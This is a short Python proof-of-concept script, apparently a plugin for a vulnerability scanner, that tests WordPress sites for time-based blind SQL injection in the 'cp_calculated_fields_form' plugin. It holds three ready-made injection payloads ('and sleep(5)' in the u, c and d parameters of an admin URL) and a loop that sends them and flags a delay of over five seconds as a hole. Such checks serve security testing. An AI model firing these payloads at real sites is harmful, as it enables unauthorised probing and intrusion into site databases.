# !/usr/bin/dev python
# -*- coding:utf-8 -*-

import re
import time
"""
reference:
http://www.beebeeto.com/pdb/poc-2015-0057/
"""


def assign(service, arg):
    if service == 'wordpress':
        return True, arg
    pass


def audit(arg):
    url = arg
    payloads = {'/wp-admin/options-general.php?page=cp_calculated_fields_form&u=2%20and%20sleep(5)&name=InsertText',
                '/wp-admin/options-general.php?page=cp_calculated_fields_form&c=21%20and%20sleep(5)',
                '/wp-admin/options-general.php?page=cp_calculated_fields_form&d=3%20and%20sleep(5)'
                }
    for payload in payloads:
        target_url = url + payload
        start_time = time.time()
        #print '[*]Request URL: ' + target_url
        code, head, res, _, _ = curl.curl(target_url)
        if code == 200:
            if time.time() - start_time > 5:
                security_hole('[*]SQL INJECTION EXSISTS :' + target_url)
    pass


if __name__ == "__main__":
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com')[1])
